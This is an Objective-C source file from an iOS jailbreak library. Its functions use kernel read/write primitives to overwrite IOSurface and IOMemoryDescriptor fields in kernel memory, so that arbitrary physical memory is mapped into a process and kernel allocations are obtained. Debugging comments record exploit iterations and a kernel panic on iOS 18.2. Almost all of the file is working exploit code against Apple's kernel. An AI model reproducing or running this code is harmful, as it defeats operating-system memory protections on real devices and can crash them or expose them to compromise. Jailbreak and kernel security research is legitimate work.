#import "info.h"
#import "primitives.h"
#import "translation.h"
#import "kernel.h"
#import "util.h"
#import <Foundation/Foundation.h>
#import <IOSurface/IOSurfaceRef.h>
#import <CoreGraphics/CoreGraphics.h>
#import <mach-o/dyld.h>

uint64_t IOSurfaceRootUserClient_get_surfaceClientById(uint64_t rootUserClient, uint32_t surfaceId)
{
	uint64_t surfaceClientsArray = kread_ptr(rootUserClient + 0x118);
	return kread_ptr(surfaceClientsArray + (sizeof(uint64_t)*surfaceId));
}

uint64_t IOSurfaceClient_get_surface(uint64_t surfaceClient)
{
	return kread_ptr(surfaceClient + 0x40);
}

uint64_t IOSurfaceSendRight_get_surface(uint64_t surfaceSendRight)
{
	if (gPrimitives.krwMinSafeReadSize > 0x8) {
		uint32_t zoneSize = 0x30;
		uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

		uint8_t buf[gPrimitives.krwMinSafeReadSize];
		kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
		return UNSIGN_PTR(*(uint64_t *)(&buf[0x18 - readOffset]));
	} else {
		return kread_ptr(surfaceSendRight + 0x18);
	}
}

uint64_t IOSurface_get_ranges(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, ranges));
}

void IOSurface_set_ranges(uint64_t surface, uint64_t ranges)
{
	kwrite64(surface + koffsetof(IOSurface, ranges), ranges);
}

uint64_t IOSurface_get_memoryDescriptor(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, memoryDescriptor));
}

uint64_t IOMemoryDescriptor_get_ranges(uint64_t memoryDescriptor)
{
	return kread_ptr(memoryDescriptor + 0x60);
}

uint64_t IOMemoryDescriptor_set_ranges(uint64_t memoryDescriptor, uint64_t ranges)
{
	return kwrite64(memoryDescriptor + 0x60, ranges);
}

uint64_t IOMemorydescriptor_get_size(uint64_t memoryDescriptor)
{
	return kread64(memoryDescriptor + 0x50);
}

void IOMemoryDescriptor_set_size(uint64_t memoryDescriptor, uint64_t size)
{
	kwrite64(memoryDescriptor + 0x50, size);
}

void IOMemoryDescriptor_set_wired(uint64_t memoryDescriptor, bool wired)
{
	kwrite8(memoryDescriptor + 0x88, wired);
}

uint32_t IOMemoryDescriptor_get_flags(uint64_t memoryDescriptor)
{
	return kread32(memoryDescriptor + 0x20);
}

void IOMemoryDescriptor_set_flags(uint64_t memoryDescriptor, uint32_t flags)
{
	kwrite8(memoryDescriptor + 0x20, flags);
}

void IOMemoryDescriptor_set_memRef(uint64_t memoryDescriptor, uint64_t memRef)
{
	kwrite64(memoryDescriptor + 0x28, memRef);
}

uint64_t IOSurface_get_rangeCount(uint64_t surface)
{
	return kread_ptr(surface + koffsetof(IOSurface, rangeCount));
}

void IOSurface_set_rangeCount(uint64_t surface, uint32_t rangeCount)
{
	kwrite32(surface + koffsetof(IOSurface, rangeCount), rangeCount);
}

uint64_t IOSurface_port_getSendRight(mach_port_t surfaceMachPort)
{
	uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
	if (koffsetof(IOMachPort, object)) {
		if (gPrimitives.krwMinSafeReadSize > 0x8) {
			uint32_t zoneSize = koffsetof(IOMachPort, object) + 0x8; // object is the last field in IOMachPort
			uint64_t readOffset = zoneSize - gPrimitives.krwMinSafeReadSize;

			uint8_t buf[gPrimitives.krwMinSafeReadSize];
			kreadbuf(surfaceSendRight + readOffset, &buf[0], gPrimitives.krwMinSafeReadSize);
			surfaceSendRight = UNSIGN_PTR(*(uint64_t *)(&buf[gPrimitives.krwMinSafeReadSize - 0x8]));
		} else {
			surfaceSendRight = kread_ptr(surfaceSendRight + koffsetof(IOMachPort, object));
		}
	}
	return surfaceSendRight;
}

static mach_port_t IOSurface_map_getSurfacePort(uint64_t magic, uint32_t cacheMode)
{
	IOSurfaceRef surfaceRef = NULL;
	if (cacheMode != 0) {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
			(__bridge NSString *)kIOSurfaceCacheMode : @(cacheMode),
		});
	} else {
		surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
			(__bridge NSString *)kIOSurfaceWidth : @120,
			(__bridge NSString *)kIOSurfaceHeight : @120,
			(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
		});
	}

	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	*((uint64_t *)IOSurfaceGetBaseAddress(surfaceRef)) = magic;
	IOSurfaceDecrementUseCount(surfaceRef);
	CFRelease(surfaceRef);
	return port;
}

struct IOSurface_toCleanup {
	uint64_t descriptor;
	uint64_t origRanges;
	uint64_t *fakeRangesUA;
};

struct IOSurface_toCleanup *cleanups = NULL;
unsigned cleanupsCount = 0;

int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32_t cacheMode)
{
	// v73: step-by-step beacons — kmap-fail at fwscan time was instant and
	// uniform across all 8 census windows; this names the failing step.
	// No control-flow changes: only observations (plus a NULL-port guard
	// that only matters in the already-failing case).
	jb_tr_beacon("KMAP step0,pa=%llx,size=%llx,cm=%u",
	             (unsigned long long)pa, (unsigned long long)size, cacheMode);
	// v77: per-window setter bisect. v76's A/B exonerated the zeroing pokes
	// (skip == apply == lookup=0 across all 16 windows) and the 32-bit flags
	// write landed. ONE unknown remains: does IOSurfaceLookupFromMachPort
	// work on an UNTOUCHED 18.2 surface, or does one specific setter break
	// it? Each window skips a different subset (bit set = skip):
	//   bit0 ranges  bit1 size  bit2 wired  bit3 memRef  bit4 flags
	// Window 0 = pure control (vendor path, straight to lookup). Pokes are
	// retired everywhere (their real values live in KMAP pre,desc).
	static unsigned g_kmap_seq = 0;
	unsigned seq = g_kmap_seq++;
	static const unsigned kSkipMasks[16] = {
		0x3F, 0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x30,
		0x38, 0x3E, 0x3D, 0x3B, 0x37, 0x2F, 0x3F, 0x3F,
	};
	unsigned skip = kSkipMasks[seq & 15];
	jb_tr_beacon("KMAP win=%u,skip=%02x", seq, skip);
	mach_port_t surfaceMachPort = IOSurface_map_getSurfacePort(1337, cacheMode);
	if (!surfaceMachPort) {
		jb_tr_beacon("KMAP fail,noport");
		return -1;
	}
	uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
	uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
	uint64_t desc = IOSurface_get_memoryDescriptor(surface);
	uint64_t ranges = IOMemoryDescriptor_get_ranges(desc);
	jb_tr_beacon("KMAP step1,sr=%llx,surface=%llx,desc=%llx,ranges=%llx",
	             (unsigned long long)surfaceSendRight,
	             (unsigned long long)surface,
	             (unsigned long long)desc, (unsigned long long)ranges);

	// v75: desc-side pre-state baseline. NOTE: v74's baseline read
	// kread64(ranges)/kread64(ranges+8) — the ranges ELEMENT is a 16-byte
	// kalloc.type6.16 object and ClearSword's fixed 32-byte RMW tripped
	// zone bound checks → kernel panic 2026-09-05 21:37:02. LAW: never aim
	// a ClearSword primitive at a sub-32-byte kernel object. All reads
	// below are INSIDE the (large) memory descriptor object.
	jb_tr_beacon("KMAP pre,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
	             (unsigned long long)kread64(desc + 0x60),
	             (unsigned long long)kread64(desc + 0x50),
	             (unsigned int)kread32(desc + 0x20),
	             (unsigned long long)kread64(desc + 0x28),
	             (unsigned int)kread8(desc + 0x88),
	             (unsigned long long)kread64(desc + 0x70),
	             (unsigned long long)kread64(desc + 0x18),
	             (unsigned long long)kread64(desc + 0x90));

	if (skip & 0x01) {
		jb_tr_beacon("KMAP ranges,skipped,orig=%llx", (unsigned long long)ranges);
	}
	else if (gPrimitives.krwMinSafeReadSize > 0x10) {
		jb_tr_beacon("KMAP path,fakeranges,minsafe=%x", gPrimitives.krwMinSafeReadSize);
		// If the primitive we have cannot read <=0x10 bytes at a time, we need to create our own struct
		// And later clean it up when we have a better primitive in IOSurface_map_cleanup
		uint64_t *fakeRanges = malloc(2 * sizeof(uint64_t));
		fakeRanges[0] = pa;
		fakeRanges[1] = size;

		uint64_t fakeRanges_kva = phystokv(vtophys(ttep_self(), (uint64_t)fakeRanges));
		jb_tr_beacon("KMAP fakeranges,kva=%llx", (unsigned long long)fakeRanges_kva);
		IOMemoryDescriptor_set_ranges(desc, fakeRanges_kva);
		// v75: verify the swap via the DESC field only (never read the
		// 16-byte ranges element through the primitive).
		jb_tr_beacon("KMAP rb,ranges,now=%llx,expect=%llx",
		             (unsigned long long)IOMemoryDescriptor_get_ranges(desc),
		             (unsigned long long)fakeRanges_kva);
		cleanups = realloc(cleanups, ++cleanupsCount * sizeof(struct IOSurface_toCleanup));
		cleanups[cleanupsCount-1].descriptor = desc;
		cleanups[cleanupsCount-1].origRanges = ranges;
		cleanups[cleanupsCount-1].fakeRangesUA = fakeRanges;
	}
	else {
		// v75 NOTE: this branch (minsafe<=0x10) writes the 16-byte ranges
		// ELEMENT via kwrite64 — ClearSword's 32-byte RMW would trip zone
		// bound checks on it (panic 2026-09-05 21:37:02 class). Branch is
		// dead today (minsafe=0x20) but must never run without rework.
		kwrite64(ranges, pa);
		kwrite64(ranges+8, size);
	}

	if (!(skip & 0x02)) {
		IOMemoryDescriptor_set_size(desc, size);
	}

	// v77: the 0x70/0x18/0x90 zeroing pokes are RETIRED — v76's A/B proved
	// skip == apply (identical lookup=0 everywhere), and on 18.2 these fields
	// held real kernel pointers. Pre-rewrite values are in KMAP pre,desc.

	if (!(skip & 0x04)) {
		IOMemoryDescriptor_set_wired(desc, true);
	}

	uint32_t flags = IOMemoryDescriptor_get_flags(desc);
	if (!(skip & 0x10)) {
		// v76: 32-bit flags write — the 8-bit setter can never clear the
		// 0x400 bit (byte 1) of the 0x410 mask on 18.2.
		uint32_t newflags = (flags & ~0x410) | 0x20;
		kwrite32(desc + 0x20, newflags);
		jb_tr_beacon("KMAP flags32,pre=%x,want=%x", flags, newflags);
	}
	else {
		jb_tr_beacon("KMAP flags,kept=%x", flags);
	}

	if (!(skip & 0x08)) {
		IOMemoryDescriptor_set_memRef(desc, 0);
	}

	// v75: full post-rewrite desc readback — diff against `pre,desc` names
	// the exact setter that mangled (or failed to mangle) the descriptor.
	jb_tr_beacon("KMAP post,desc,r60=%llx,r50=%llx,f20=%x,m28=%llx,w88=%x,d70=%llx,d18=%llx,d90=%llx",
	             (unsigned long long)kread64(desc + 0x60),
	             (unsigned long long)kread64(desc + 0x50),
	             (unsigned int)kread32(desc + 0x20),
	             (unsigned long long)kread64(desc + 0x28),
	             (unsigned int)kread8(desc + 0x88),
	             (unsigned long long)kread64(desc + 0x70),
	             (unsigned long long)kread64(desc + 0x18),
	             (unsigned long long)kread64(desc + 0x90));

	IOSurfaceRef mappedSurfaceRef = IOSurfaceLookupFromMachPort(surfaceMachPort);
	// v76: split the final verdict — v75's "lookup=0,base=0" could not say
	// WHICH of the two calls failed.
	jb_tr_beacon("KMAP lookup=%d", mappedSurfaceRef != NULL);
	void *mappedBase = mappedSurfaceRef ? IOSurfaceGetBaseAddress(mappedSurfaceRef) : NULL;
	jb_tr_beacon("KMAP base=%llx", (unsigned long long)(uintptr_t)mappedBase);
	*uaddr = mappedBase;
	return 0;
}

int IOSurface_map(uint64_t pa, uint64_t size, void **uaddr) {
	return IOSurface_map_withCacheMode(pa, size, uaddr, 0);
}

void IOSurface_map_cleanup(void)
{
	if (cleanupsCount == 0) return;

	for (unsigned i = 0; i < cleanupsCount; i++) {
		uint64_t desc = cleanups[i].descriptor;
		uint64_t origRanges = cleanups[i].origRanges;
		uint64_t *fakeRangesUA = cleanups[i].fakeRangesUA;

		IOMemoryDescriptor_set_ranges(desc, origRanges);
		free(fakeRangesUA);
	}

	free(cleanups);
	cleanups = NULL;
	cleanupsCount = 0;
}

static CFNumberRef CFNUM64(uint64_t value) {
    return CFNumberCreate(NULL, kCFNumberSInt64Type, (void *)&value);
}

static mach_port_t IOSurface_kalloc_getSurfacePort_16up(uint64_t size) {
	uint64_t rangesAlignedSize = ((size + 0xf) & ~0xf);

	static vm_size_t dummyPageSize = 0x4000;
	static vm_address_t dummyPage = 0;
	if (dummyPage == 0) {
		vm_allocate(mach_task_self(), &dummyPage, dummyPageSize, VM_FLAGS_ANYWHERE);
	}

	uint64_t *userspaceRanges = malloc(rangesAlignedSize);
	for (int i = 0; i < (rangesAlignedSize / sizeof(uint64_t)); i += 2) {
		userspaceRanges[i] = dummyPage;
		userspaceRanges[i+1] = dummyPageSize;
	}

    CFDataRef userspaceRangesData = CFDataCreate(kCFAllocatorDefault, (const UInt8 *)userspaceRanges, rangesAlignedSize);
    free(userspaceRanges);

    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
	CFNumberRef dummyPageSizeNum = CFNUM64(dummyPageSize);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAllocSize"),     (const void *)dummyPageSizeNum);
    CFDictionarySetValue(dict, CFSTR("IOSurfaceAddressRanges"), (const void *)userspaceRangesData);

    IOSurfaceRef surfaceRef = IOSurfaceCreate(dict);
    mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
    IOSurfaceDecrementUseCount(surfaceRef);

	CFRelease(userspaceRangesData);
	CFRelease(dummyPageSizeNum);
	CFRelease(dict);

    return port;
}

uint64_t IOSurface_kalloc_16up(uint64_t size, bool leak)
{
	if (size > 0x10000) return -1; // 0x10000 is max

	while (true) {
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_16up(size);

		uint64_t surfaceSendRight = IOSurface_port_getSendRight(surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);
		uint64_t vaSize = IOSurface_get_rangeCount(surface) * 0x10;

		if (vaSize < size) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va;
	}

	return 0;
}

static mach_port_t IOSurface_kalloc_getSurfacePort_15(uint64_t size)
{
	uint64_t allocSize = 0x10;
	uint64_t *addressRangesBuf = (uint64_t *)malloc(size);
	memset(addressRangesBuf, 0, size);
	addressRangesBuf[0] = (uint64_t)malloc(allocSize);
	addressRangesBuf[1] = allocSize;
	NSData *addressRanges = [NSData dataWithBytes:addressRangesBuf length:size];
	free(addressRangesBuf);

	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		@"IOSurfaceAllocSize" : @(allocSize),
		@"IOSurfaceAddressRanges" : addressRanges,
	});
	mach_port_t port = IOSurfaceCreateMachPort(surfaceRef);
	IOSurfaceDecrementUseCount(surfaceRef);
	return port;
}

uint64_t IOSurface_kalloc_15(uint64_t size, bool leak)
{
	while (true) {
		uint64_t allocSize = max(size, 0x10000);
		mach_port_t surfaceMachPort = IOSurface_kalloc_getSurfacePort_15(allocSize);

		uint64_t surfaceSendRight = task_get_ipc_port_kobject(task_self(), surfaceMachPort);
		uint64_t surface = IOSurfaceSendRight_get_surface(surfaceSendRight);
		uint64_t va = IOSurface_get_ranges(surface);

		if (kvtophys(va + allocSize) != 0) {
			mach_port_deallocate(mach_task_self(), surfaceMachPort);
			continue;
		}

		if (va == 0) continue;

		if (leak) {
			IOSurface_set_ranges(surface, 0);
			IOSurface_set_rangeCount(surface, 0);
		}

		return va + (allocSize - size);
	}

	return 0;
}

int IOSurface_kalloc_global(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, true);
	}
	else {
		alloc = IOSurface_kalloc_15(size, true);
	}

	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

int IOSurface_kalloc_local(uint64_t *addr, uint64_t size)
{
	uint64_t alloc = 0;
	if (@available(iOS 16.0, *)) {
		alloc = IOSurface_kalloc_16up(size, false);
	}
	else {
		alloc = IOSurface_kalloc_15(size, false);
	}
	if (alloc != 0) {
		*addr = alloc;
		return 0;
	}
	return -1;
}

void libjailbreak_IOSurface_primitives_init(void)
{
	IOSurfaceRef surfaceRef = IOSurfaceCreate((__bridge CFDictionaryRef)@{
		(__bridge NSString *)kIOSurfaceWidth : @120,
		(__bridge NSString *)kIOSurfaceHeight : @120,
		(__bridge NSString *)kIOSurfaceBytesPerElement : @4,
	});
	if (!surfaceRef) {
		char execPath[PATH_MAX];
		uint32_t execPathSize = PATH_MAX;
		_NSGetExecutablePath(execPath, &execPathSize);
		printf("Failed to initialize IOSurface primitives, add \"IOSurfaceRootUserClient\" to the \"com.apple.security.exception.iokit-user-client-class\" dictionary of the entitlements from \"%s\" to fix this. Due to this, the kalloc, kmap and kcall primitives will not work.\n", execPath);
		return;
	}
	CFRelease(surfaceRef);

	gPrimitives.kmap = IOSurface_map;
	gPrimitives.kalloc_global = IOSurface_kalloc_global;
	gPrimitives.kalloc_local  = IOSurface_kalloc_local;
}